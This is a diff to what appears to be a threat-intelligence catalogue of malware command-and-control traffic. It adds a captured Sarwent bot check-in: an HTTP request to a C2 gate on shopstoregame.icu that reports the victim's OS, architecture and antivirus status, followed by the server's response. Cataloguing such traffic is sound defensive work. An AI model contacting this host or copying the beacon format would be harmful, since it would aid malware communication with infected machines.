@@ -930,6 +930,27 @@ InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213R
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")
 
+#### Sarwent BOT"
+~~~
+GET /gate/connect?os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
+Host: shopstoregame.icu
+Connection: keep-alive
+User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
+Accept: */*
+
+HTTP/1.1 200 OK
+Date: Mon, 14 Oct 2019 11:02:40 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IjNkQ2hqY01YSVJtRUlBM1REeCtxRkE9PSIsInZhbHVlIjoiV1Y2dkxHMjRYWm5TemxGOFNUWHlKU0hZTWNJKyszaVh3SVEzb3pWcEFBeUhFOU9UQms3a3ZKMUo3U1NLNzE0dCIsIm1hYyI6IjZlMWEwMTM2YjE0NDcxMzJkYjY1MmE2NmQxZjU0YzJjYjAwODU0MWI0YTRhMTUyNzQxOTg2MjYwNjQyMjAyOWIifQ%3D%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/
+Set-Cookie: laravel_session=eyJpdiI6Ijd5dUpwTE5yMmFWeUFPVmZTUlA3bnc9PSIsInZhbHVlIjoiTlpNajV5eDVFWlVzUDdjMFwvdFlTYm41UVNFVW5JdVJuZzdvN0ZFcWNaWFRlOXcwUWRVSUdwQm0wK1VFSmRBQkoiLCJtYWMiOiJlNjg1OGMzNWQ5ZDI2NjU2ZmU0MzBiNjNkN2Y3MDAwZDhhZThkMTllNWQ2MTRlYWM5YzI3MGI0MzllYzg2MDI4In0%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/; httponly
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent.png "Sarwent BOT")
+
 #### Servhelper
 ~~~
 POST /like/s.php HTTP/1.1
